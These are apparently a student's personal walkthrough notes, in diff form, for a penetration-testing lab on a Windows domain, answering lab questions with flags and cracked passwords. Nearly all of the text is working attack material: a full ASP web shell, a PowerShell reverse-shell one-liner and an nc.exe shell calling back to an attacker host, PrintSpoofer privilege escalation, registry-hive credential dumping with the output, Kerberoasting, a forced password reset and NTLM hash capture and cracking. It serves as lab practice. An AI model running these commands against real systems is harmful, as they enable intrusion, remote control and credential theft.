@@ -62,108 +62,14 @@ Syntax: xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home
 
 
 
-looks like were gonna need to copy printspoofer over again and run all the steps from yesterday again so ill jsut copy and paste from yesterdayss lesson: 
-
-
-1) clear all old stuff. 
-2) ssh -D 9050 root@10.129.82.126 -i rootkey
-3) in new terminal -> proxychains firefox 172.16.8.20 -> wait for it to open 
-4) go to settings -> sql console -> type: 
-EXEC sp_configure 'show advanced options', '1'
-RECONFIGURE
-EXEC sp_configure 'xp_cmdshell', '1' 
-RECONFIGURE
-5) hti run script -> itll come back with nothing, which is fine. delete all that then confirm with this 
-6) xpcmdshell 'whoami' 
-7) whitelist the extensions asp,aspx,exe,SAVE by editing "Allowable File Extensions": -> securityi -> more -> more security -> whitelist extensions
-8) on KALI nano ASPshell then copy and paste below: 
-
-<%
-Set oScript = Server.CreateObject("WSCRIPT.SHELL")
-Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
-Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
-Function getCommandOutput(theCommand)
-    Dim objShell, objCmdExec
-    Set objShell = CreateObject("WScript.Shell")
-    Set objCmdExec = objshell.exec(thecommand)
-    getCommandOutput = objCmdExec.StdOut.ReadAll
-end Function
-%>
-
-
-<HTML>
-<BODY>
-<FORM action="" method="GET">
-<input type="text" name="cmd" size=45 value="<%= szCMD %>">
-<input type="submit" value="Run">
-</FORM>
-<PRE>
-<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
-<%Response.Write(Request.ServerVariables("server_name"))%>
-<p>
-<b>The server's port:</b>
-<%Response.Write(Request.ServerVariables("server_port"))%>
-</p>
-<p>
-<b>The server's software:</b>
-<%Response.Write(Request.ServerVariables("server_software"))%>
-</p>
-<p>
-<b>The server's software:</b>
-<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
-<% szCMD = request("cmd")
-thisDir = getCommandOutput("cmd /c" & szCMD)
-Response.Write(thisDir)%>
-</p>
-<br>
-</BODY>
-</HTML> 
-
-9) upload that to the /admin/file-management -> once uplaoded click on it and itll take you to shell 
-10) OPEN ON NEW REGULAR ROOT SSH -> nc nlvp 9999
-11) on web shell use this PS oneliner to initate rev shell -> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.120',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-12) catch it on root shh 
-13)  ON KALI MACHINE RUN THESE TWO COMMANDS FOR NETCAT AND PRINTSPOOFER  
-
-wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
-wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
-
-14) upload them to /admin/file-management just like we did with ASPshell 
-15) a NEW NEW regular root ssh shell adn run nc -nlvp 4444 -> this will catch printspoofer shell 
-16) on the shell we caught from ASPshell run this command -> c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 4444 -e cmd" 
-17) we now have nt authority \ system on printspooofer shell aka 4444
-18) on 4444 shell: 
-cd c:\dotnetnuke\portals\0\
-reg save HKLM\SYSTEM SYSTEM.SAVE
-reg save HKLM\SECURITY SECURITY.SAVE
-reg save HKLM\SAM SAM.SAVE
-19) save from /admin/file-management ** must do one by one for whatever reason. 
-20) ON KALI MACHINE: 
-secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE 
-
-
-Output: 
-Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
-[*] Dumping cached domain logon information (domain/username:hash)
-INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45)
-[*] Dumping LSA Secrets
-[*] $MACHINE.ACC 
-$MACHINE.ACC:plain_password_hex:021e473e87d15de11d5e93c5a7195d2fb726f3eab764bbb6fa497751e7c31375bda5e0f6eb5324530767ed28f65eccfdfb1c64fc380cf19739691a61baec4e7dfc82e6d68bd9807e7d1b9b03c88f99d3094654d5fb3aacc2a25b5af688b7de1def50826409556dbdde4b866853729c7cdec6c847fc4daa5c11ac353b40a65860e8f501ef4a8df6a1de7f5851899bd04b14e4fd9cc6688e870c90940b041c1ce8aee9130d903a877d6f23d881ff76d75a5dd22fdffc7b23c7e48f62cd46373e7feb0464de60737a9874410b8e10784caddb0aaff67b3b1c4fc71df9c09ec2bc23bf6b9948854e4c713f4de119deea14c3
-$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:47377299aecaba8fa720b9d9b79a022d
-[*] DefaultPassword 
-(Unknown User):Gr8hambino!
-[*] DPAPI_SYSTEM 
-dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
-dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
+okay al lwe ACTUALLY need is the rootkey and the password we found for hporter. 
 
 
 
 
+
+
+hporter:Gr8hambino!
 
 
 
@@ -209,7 +115,106 @@ WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
 hporter:Gr8hambino!
 
 
+Question 1 -  Find a backup script that contains the password for the backupadm user. Submit this user's password as your answer. - !qazXSW@
 
-
-1 ssh -D 9050 -i rootkey -L 13389:172.16.8.20:3389 root@10.129.229.147
+1 ssh -D 9050 -i rootkey -L 13389:172.16.8.20:3389 root@10.129.200.168
 2) xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:shared,/home/htb-ac-1235531/Desktop
+3) once in the command line for hporter -> cd C:\share
+4) from C:\share run -> net use should say something like \\TSCLIENT\shared
+5) ON KALI MACHINE -> +
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.44/Snaffler.exe
+6) back on hporter CLI -> 
+
+copy \\TSCLIENT\shared\PowerView.ps1
+copy \\TSCLIENT\shared\Snaffler.exe
+
+7) still on hporter -> 
+powershell
+Import-Module .\PowerView.ps1
+Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Pwned123' -AsPlainText -Force) -Verbose
+
+8) still on hporter -> 
+.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+
+We find - [INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2022-09-08 01:16:09Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\Department Shares>(R) Share for department users 
+
+9) *** SUDO SU ONJ KALI !!!!!! ** on root shell run ->  proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Pwned123 -M spider_plus --share 'Department Shares'
+
+10) cat /tmp/cme_spider_plus/172.16.8.3.json  ( itll be something similar but a lil different than this ) 
+- we find : IT/Private/Development/SQL Express Backup.ps1 
+
+11) i did this on a root kali terminal again: 
+proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares'
+get IT\Private\Development\"SQL Express Backup.ps1"
+
+12) cat IT\\Private\\Development\\SQL\ Express\ Backup.ps1
+
+output: $mySrvConn.Login = "backupadm"
+$mySrvConn.Password = "!qazXSW@"
+
+
+Question 2 - Perform a Kerberoasting attack and retrieve TGS tickets for all accounts set as SPNs. Crack the TGS of the backupjob user and submit the cleartext password as your answer.
+
+1) i cleared everything then started with a new one
+2) ssh -D 9050 -i rootkey root@10.129.98.34
+3) ran this one from ROOT KALI terminal -> proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/hporter -request -outputfile SPNS
+4) once hashes are captured put into file on kali and run this hashcat 
+hashcat -O -w 3 -m 13100 SPNS /usr/share/wordlists/rockyou.txt 
+5) output: lucky7 
+
+
+
+
+Question 3 -  Escalate privileges on the MS01 host and submit the contents of the flag.txt file on the Administrator Desktop.
+
+1) again clear everythign
+2)  ssh -D 9050 -i rootkey root@10.129.98.34
+3) i did this on ROOT KALI -> proxychains evil-winrm -i 172.16.8.50 -u backupadm
+4) students should know about this file either from digging around themselves or from the section's reading (lol)
+5) type C:\panther\unattend.xml 
+6) output: 
+
+   <Password>
+                    <Value>Sys26Admin</Value>
+                    <PlainText>true</PlainText>
+                </Password>
+                <Enabled>true</Enabled>
+                <LogonCount>1</LogonCount>
+                <Username>ilfserveradm</Username>
+
+7) creds of ilfserveradm:Sys26Admin
+8) proxychains xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:Sys26Admin
+9) go to file explorer -> users\ilfserveradm\Documents - add pwn.bat file and put this inside the file -> net localgroup administrators ilfserveradm /add 
+10) now this... idk wtf this is or when tf we were taught it but... 
+11) run sysaxschedscp.exe and click on Setup Scheduled/Triggered Tasks...:
+12) Add task (Triggered) ...:
+13) "Folder to Monitor" to be C:\Users\ilfserveradm\Documents\ and check Run task if a file is added to the monitor folder or subfolder(s):
+14) Run any other Program and choose C:\Users\ilfserveradm\Documents\pwn.bat
+15) uncheck Login as the following user to run task, then click Next and then Finish:
+16) create any file in C:\Users\ilfserveradm\Documents so that the task is triggered and the batch script is executed:
+17) to confirm  open powershell and type -> net localgroup administrators
+18) in file explorer go to C:\Users\Administrator\Desktop\ -> type in .\ilfserveradm:Sys26Admin and click on flag - 33a9d46de4015e7b3b0ad592a9394720  
+
+
+
+wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
+
+copy from KALI file system... actually right click -> copy -> RDP'd desktop -> right click -> paste 
+
+open powershell as admin with creds or -> .\ilfserveradm:Sys26Admin
+
+cd C:\Users\ilfserveradm\Desktop\
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
+
+
+and of course.. didnt work but we have the hash.. sometiems i fuckkkkkkkkkkkkkkkkkkking hate these rooms when you do everything right and shit still doesnt work...
+
+MPALLEDOROUS::ACADEMY-AEN-DEV:477f4c13cb9a1d84:68a32591cf780a08b97ddf88b74562f2:01010000000000000bfcbcdc50d3d80129d4a3832c8060f20000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00410045004e002d004d00530030000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004800410043004100440045004d0059002d00410045004e002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008000bfcbcdc50d3d80106000400020000000800300030000000000000000000000000200000f639834f7a1ff15762aa38b165a715249d7c9429b72ac5ea2f93a6ae00285f920a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0038002e0035003000000000000000000000000000
+
+copy to doc on KALI machine then run 
+
+hashcat -m 5600 dumb.txt /usr/share/wordlists/rockyou.txt and get output of: 
+
+1squints2
